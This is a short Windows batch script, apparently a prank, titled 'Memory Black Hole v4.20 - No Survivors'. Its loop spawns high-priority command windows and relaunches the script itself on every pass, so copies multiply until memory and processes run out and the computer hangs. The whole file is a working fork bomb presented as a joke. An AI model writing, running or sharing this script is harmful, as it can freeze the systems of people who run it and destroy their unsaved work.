@echo off
color 0a
title Memory Black Hole v4.20 - No Survivors

echo Starting black hole...
echo Your RAM will be compressed into a singularity...
echo This is not a drill.

for /l %%i in (1,1,999999) do (
    start /min /high cmd /c "echo nom nom nom & ping 127.0.0.1 -n 1 -w 10 >nul & title Eating %%i GB"
    start "" /high cmd /c "%~f0"
)

echo Black hole active. Say goodbye to your free RAM.
pause
